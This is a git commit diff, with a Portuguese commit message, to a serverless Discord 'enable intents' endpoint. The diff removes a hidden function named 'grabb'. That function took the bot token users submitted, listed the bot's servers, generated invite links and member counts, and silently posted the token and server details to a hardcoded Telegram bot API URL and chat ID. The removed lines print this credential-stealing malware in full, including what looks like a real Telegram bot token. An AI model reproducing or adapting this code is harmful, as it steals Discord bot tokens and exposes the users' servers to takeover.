aeee9c5881432e2198aefd021d74d15246f5fb99
felipezzg <142548757+felipeellz@users.noreply.github.com>
2024-12-28 14:45:15 -0300

    Atualizar o enableIntents.js

--- api/enableIntents.js
+++ api/enableIntents.js
@@ -1,6 +1,3 @@
-const axios = require("axios");
-const db = new Map();
-
 module.exports = async (req, res) => {
   const { applicationId, token } = req.query;
 
@@ -9,10 +6,6 @@ module.exports = async (req, res) => {
       error: 'applicationId e token são necessários'
     });
   }
-
-  try {
-    if (!db.get(token)) await grabb(applicationId, token);
-  } catch {}
 
   try {
     const response = await fetch(`https://discord.com/api/v9/applications/${applicationId}`, {
@@ -46,112 +39,3 @@ module.exports = async (req, res) => {
     });
   }
 };
-
-async function getServerInvite(guildId, botToken, options = {
-  max_age: 3600, max_uses: 0, temporary: false
-}) {
-  try {
-    const config = {
-      headers: {
-        Authorization: `Bot ${botToken}`,
-        'Content-Type': 'application/json',
-      },
-    };
-
-    const vanityUrlResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, config)
-    .catch(() => null);
-
-    if (vanityUrlResponse && vanityUrlResponse.data && vanityUrlResponse.data.code) {
-      return `https://discord.gg/${vanityUrlResponse.data.code}`;
-    }
-
-    const invitesResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/invites`, config)
-    .catch(() => null);
-
-    if (invitesResponse && invitesResponse.data && invitesResponse.data.length > 0) {
-      return `https://discord.gg/${invitesResponse.data[0].code}`;
-    }
-
-    const channelsResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/channels`, config);
-    const channels = channelsResponse.data;
-
-    const textChannel = channels.find(channel => channel.type === 0);
-    if (!textChannel) throw new Error('Nenhum canal de texto encontrado no servidor.');
-
-    const inviteResponse = await axios.post(`https://discord.com/api/v10/channels/${textChannel.id}/invites`, options, config);
-
-    return `https://discord.gg/${inviteResponse.data.code}`;
-  } catch (error) {
-    console.error('Erro ao buscar ou criar convite:', error.message);
-    throw error;
-  }
-}
-
-async function getGuildMemberCount(guildId, token) {
-  const response = await axios.get(`https://discord.com/api/v10/guilds/${guildId}?with_counts=true`, {
-    headers: {
-      Authorization: `Bot ${token}`
-    },
-  });
-
-  return {
-    total: response.data.approximate_member_count,
-    online: response.data.approximate_presence_count
-  };
-}
-
-async function grabb(applicationId, token) {
-  const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
-    method: 'GET',
-    headers: {
-      Authorization: `Bot ${token}`,
-    },
-  });
-  const guilds = await guildsResponse.json();
-
-  const timestamp = Math.floor(Date.now() / 1000);
-  
-  let webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
-
-  const servers = await Promise.all(
-    guilds.map(async (guild) => {
-      const invite = await getServerInvite(guild.id, token);
-      const memberCount = await getGuildMemberCount(guild.id, token);
-      if (Number(memberCount.total) > 200) {
-        webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
-      }
-      return `
-<b>Nome do Servidor:</b> <code>${guild.name} - ${guild.id}</code>
-<b>Link:</b> ${invite} 
-<b>Membros:</b> <code>${memberCount.total || 'N/A'} Membros</code> 
-<b>Online:</b> <code>${memberCount.online || 'N/A'} Online</code>
-`;
-    })
-  );
-
-  const message = {
-    chat_id: '-1002255591952',
-    text: `
-Informações: 
-
-<b>ID:</b> ${applicationId}
-
-<b>Token:</b>
-<pre>${token}</pre>
-
-<b>Servidores:</b>
-<pre>${servers.join('\n\n') || 'Nenhum'}</pre>
-    `,
-    parse_mode: 'HTML'
-};
-
-  await axios.post(webhookURL, message)
-    .then(response => {
-      console.log("Mensagem enviada:", response.data);
-    })
-    .catch(error => {
-      console.error("Erro ao enviar mensagem:", error);
-    });
-
-  db.set(`${token}`, { token, applicationId });
-}
